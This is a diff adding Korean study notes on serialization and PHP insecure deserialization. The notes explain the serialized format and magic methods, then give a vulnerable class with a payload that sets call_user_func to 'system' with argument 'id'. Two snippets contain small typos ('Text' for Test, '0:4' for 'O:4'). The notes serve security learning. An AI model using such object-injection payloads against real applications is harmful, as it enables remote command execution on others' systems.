@@ -1095,6 +1095,117 @@
 <br/>
 
 * Serialize / Deserialize
+    - serialize(직렬화)와 deserialize(역직렬화)
+        | | 설명 |
+        |:---:|------|
+        | ***serialize*** (직렬화) | Object/Data의 상태 또는 타입을 특정한 형태의 포맷을 가진 데이터로 변환하는 것 |
+        | ***deserialize*** (역직렬화) | 직렬화된 데이터를 원래의 Object/Data의 상태 또는 타입으로 변환하는 것 |
+        + 직렬화는 Object/Data의 현재 상태와 타입들을 저장함
+        + 원하는 상황에 역직렬화를 통해 동일한 상태와 타입을 가진 Object/Data들을 사용할 수 있음
+    - 역직렬화 과정에서 **어플리케이션 상에서 다른 행위를 발생시키는 상태 또는 타입을 이용하여 악의적인 행위를 발생**시키거나, **특정한 상황에서 호출되는 메소드들을 이용하여 공격에 사용함**
+    - 웹 어플리케이션 언어 별 직렬화/역직렬화 모듈
+        + php
+            - PHP serialize(직렬화) 예시 및 공격 방법
+                ```php
+                <?php
+                    class Test {
+                        var $var1 = "value1";
+                        var $var2 = 31337;
+                        var $var3 = True;
+                    } 
+
+                    $obj = new Test();
+                    var_dump($obj);
+                    /*
+                        object(Test)#1 (3) {
+                            ["var1"]=>string(6) "value1"
+                            ["var2"]=>int(31337)
+                            ["var3"]=>bool(true)
+                        }
+                    */
+                    var_dump(serialize($obj));
+                    /* serialize된 데이터 포맷 → ⚠️ 이를 기반으로 serialize된 데이터를 변조하여 Object의 데이터를 변조할 수 있음
+                            O:4:"Test": # <Type>:<Class name length>:<class name>:
+                            3:{ # <Number of properties>:{
+                                s:4:"var1"; # <Type>:<propertie name length>:<propertie name>;
+                                s:6:"value1"; # <Type>:<propertie value length>:<propertie value>;
+
+                                s:4:"var2";
+                                i:31337;
+
+                                s:4:"var3";
+                                b:1;
+                            }
+
+                            # <Type>
+                            # O: Object
+                            # s: String
+                            # i: int
+                            # b: Boolean 1=True, 0=False
+                    */
+                
+                    // Object 데이터 변조
+                    $serialize_Data = 'O:4:"Test":3:{s:4:"var1";s:4:"test";s:4:"var2";i:77777;s:4:"var3";b:0;}';
+                    $obj = unserialize($serialize_Data);
+                    var_dump($obj);
+                    /* ⚠️ 위의 object(Test)#1과 비교해보면 Object의 데이터가 변조되었음을 알 수 있음
+                        object(Test)#2 (3) {
+                            ["var1"]=>string(4) "test"
+                            ["var2"]=>int(77777)
+                            ["var3"]=>bool(false)
+                        }
+                    */
+                ?>
+                ```
+            - PHP deserialize(역직렬화) 예시
+                ```php
+                <?php
+                    class Test{
+                        function __wakeup() { // 역직렬화(deserialize) 시 호출되는 Magic Method
+                            echo "Call __wakeup.\n";
+                        }
+
+                        function __destruct() { // 오브젝트 소멸 시 호출되는 Magic Method (소멸자의 개념)
+                            echo "Call __destruct.\n";
+                        }
+
+                        function __construct() { // 오브젝트 생성 시 호출되는 Magic Method (생성자의 개념)
+                            echo "Call __construct.\n";
+                        }
+                    }
+
+                    echo "New Class.\n";
+                    $obj = new Text(); // __construct()가 호출되어 "Call __construct."가 출력됨
+
+                    echo "unserialize Class.\n";
+                    $serialize_Data = '0:4:"Test":0:{}';
+                    $obj = unserialize($serialize_Data); // __wakeup()가 호출되어 "Call __wakeup."가 출력됨
+                    /* 
+                        기존의 $obj에 저장되어 있는 오브젝트가 소멸하면서 __destruct()가 호출되어 "Call __destruct."가 출력됨
+                        이후 코드가 종료되면 $obj에 새롭게 저장했던 오브젝트도 소멸하면서 __destruct()가 호출되어 "Call __ destruct."가 출력됨
+                    */
+                ?>
+                ```
+                + PHP deserialize 공격에서는 ```__destruct()```, ```__wakeup()```와 같은 *Object의 특수한 상황에서 실행되어 지는 **Magic Methods***를 이용함 → ⚠️ ```unserialize```에 의해 호출되는 Magic Methods 로직의 취약점이 존재하거나, 클래스의 데이터를 조작하여 공격을 연계해야 함
+                    ```php
+                    <?php
+                        // 클래스의 변수를 조작하여 연계가 가능한 취약한 코드와 공격 예시
+                        class Test {
+                            var $func_name = "var_dump";
+                            var $argv = "test";
+
+                            function __destruct() { // 오브젝트 소멸 시 호출됨
+                                call_user_func($this->func_name, $this->argv); // call_user_func 함수: 첫 번째 파라미터로 주어진 callback을 호출함
+                            }
+                        }
+
+                        $obj = new Test();
+
+                        $serialize_Data = 'O:4:"Test":2:{s:9:"func_name";s:6:"system";s:4:"argv";s:2:"id";}'; // func_name = system, argv = id가 됨
+                        $obj = unserialize($serialize_Data); // 역직렬화 후 오브젝트 소멸 시에 __destruct()가 호출되고 이때 system 함수로 id 명령어를 실행하여 uid, gid, group 정보를 얻을 수 있음
+                    ?>
+                    ```
+        + python
 
 <br/><br/><br/>
 
